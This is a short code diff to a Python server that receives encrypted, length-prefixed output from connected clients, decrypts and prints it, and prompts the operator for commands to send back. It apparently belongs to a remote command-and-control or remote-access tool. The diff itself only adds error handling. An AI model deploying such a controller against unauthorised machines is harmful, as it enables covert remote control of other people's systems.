@@ -32,12 +32,16 @@ def client(conn, addr, buff):
     while True:
         holder = []
         bs = conn.recv(8)
-        (length,) = unpack('>Q', bs)
+        try:
+            (length,) = unpack('>Q', bs)
+        except struct.error as err:
+            print("{0}".format(err))
+            break
         data = b''
         while len(data) < length:
             to_read = length - len(data)
             data += conn.recv(buff if to_read > buff else to_read)
-        print(addr[0]+':\n'+str(do_decrypt(data), 'utf-8'))
+        print(addr[0]+':\n'+str(do_decrypt(data).strip(), 'utf-8'))
         while True:
             try:
                 reply='cmd ' + input('Enter command for %s: ' %addr[0])
